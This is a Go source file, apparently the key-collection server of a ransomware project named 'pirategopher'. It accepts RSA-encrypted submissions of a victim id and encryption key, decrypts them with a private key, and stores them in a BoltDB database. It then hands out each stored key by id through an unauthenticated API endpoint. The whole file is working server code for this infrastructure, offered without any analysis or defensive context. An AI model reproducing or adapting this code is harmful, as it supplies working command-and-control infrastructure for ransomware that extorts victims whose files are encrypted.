package pirategopher

import (
	"encoding/json"
	"fmt"
	"github.com/labstack/echo/v4"
	"github.com/labstack/echo/v4/middleware"
	"io/ioutil"
	"log"
	"net/http"
)

type echoEngine struct {
	*echo.Echo
	PrivateKey []byte
	Db         *BoltDB
}

type SimpleResponse struct {
	Status  int
	Message string
}

var (
	ApiResponseForbidden        = SimpleResponse{Status: http.StatusForbidden, Message: "Seems like you are not welcome here... Bye"}
	ApiResponseBadJson          = SimpleResponse{Status: http.StatusBadRequest, Message: "Expect valid json payload"}
	ApiResponseInternalError    = SimpleResponse{Status: http.StatusInternalServerError, Message: "Internal Server Error"}
	ApiResponseDuplicatedId     = SimpleResponse{Status: http.StatusConflict, Message: "Duplicated Id"}
	ApiResponseBadRSAEncryption = SimpleResponse{Status: http.StatusUnprocessableEntity, Message: "Error validating payload, bad public key"}
	ApiResponseNoPayload        = SimpleResponse{Status: http.StatusUnprocessableEntity, Message: "No payload"}
	ApiResponseBadRequest       = SimpleResponse{Status: http.StatusBadRequest, Message: "Bad Request"}
	ApiResponseResourceNotFound = SimpleResponse{Status: http.StatusTeapot, Message: "Resource Not Found"}
	ApiResponseNotFound         = SimpleResponse{Status: http.StatusNotFound, Message: "Not Found"}
)

func CreateServer(port int, key, database string) {
	privKey, err := ioutil.ReadFile(key)
	if err != nil {
		log.Fatal(err)
	}

	db := openDb(database)
	defer db.Close()

	engine := &echoEngine{
		Echo: 		echo.New(),
		PrivateKey: privKey,
		Db: 		db,
	}
	engine.GET("/", engine.index)

	engine.Use(middleware.Logger())
	engine.Use(middleware.Recover())

	api := engine.Group("/api", middleware.CORS())
	api.POST("/keys/add", engine.addKeys, engine.decryptPayloadMiddleware)
	api.GET("/keys/:id", engine.getEncryptionKey)
	engine.Logger.Fatal(engine.Start(fmt.Sprintf(":%d", port)))

}

func (e *echoEngine) index(c echo.Context) error {
	return c.String(http.StatusOK, "OK")
}

func (e *echoEngine) addKeys(c echo.Context) error {
	payload := c.Get("payload").([]byte)

	var keys map[string]string
	if err := json.Unmarshal(payload, &keys); err != nil {
		return c.JSON(http.StatusBadRequest, ApiResponseBadJson)
	}

	available, err := e.Db.isAvailable(keys["id"], "keys")
	if err != nil && err != errorBucketDoesNotExist {
		return c.JSON(http.StatusInternalServerError, ApiResponseInternalError)
	}

	if available || err == errorBucketDoesNotExist {
		err = e.Db.createOrUpdate(keys["id"], keys["enckey"], "keys")
		if err != nil {
			return c.JSON(http.StatusInternalServerError, "")
		}

		c.Logger().Printf("Successfully saved key pair %s - %s", keys["id"], keys["enckey"])
		return c.NoContent(http.StatusNoContent)
	}

	// Id already exists
	return c.JSON(http.StatusConflict, ApiResponseDuplicatedId)
}

func (e *echoEngine) decryptPayloadMiddleware(next echo.HandlerFunc) echo.HandlerFunc {
	return func(c echo.Context) error {
		payload := c.FormValue("payload")
		if payload == "" {
			return c.JSON(http.StatusUnprocessableEntity, ApiResponseNoPayload)
		}

		jsonPayload, err := decrypt(e.PrivateKey, []byte(payload))
		if err != nil {
			c.Logger().Print("Bad payload encryption, rejecting...\n")
			return c.JSON(http.StatusUnprocessableEntity, ApiResponseBadRSAEncryption)
		}

		c.Set("payload", jsonPayload)
		return next(c)
	}
}

func (e *echoEngine) getEncryptionKey(c echo.Context) error {
	id := c.Param("id")
	if len(id) != 32 {
		return c.JSON(http.StatusBadRequest, ApiResponseBadRequest)
	}

	enckey, err := e.Db.find(id, "keys")
	if err != nil {
		return c.JSON(http.StatusTeapot, ApiResponseResourceNotFound)
	}

	return c.JSON(http.StatusOK, fmt.Sprintf(`{"status": 200, "enckey": "%s"}`, enckey))
}
